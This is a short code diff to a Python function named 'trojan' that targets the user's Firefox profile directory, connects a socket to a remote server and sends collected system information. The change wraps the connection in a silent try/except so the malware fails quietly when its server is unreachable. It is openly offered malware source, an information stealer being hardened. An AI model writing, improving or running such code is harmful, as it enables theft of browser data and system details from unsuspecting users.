@@ -25,7 +25,10 @@ def trojan():
     path = f"{os.path.expanduser('~')}/.mozilla/firefox/"
 
     # Connect to the server
-    client.connect((serv_addr, port))
+    try:
+        client.connect((serv_addr, port))
+    except Exception as e :
+        return
 
     # Prepare system information as a string
     data = '\n'.join(f'{key}: {value}' for key, value in system_info.items())
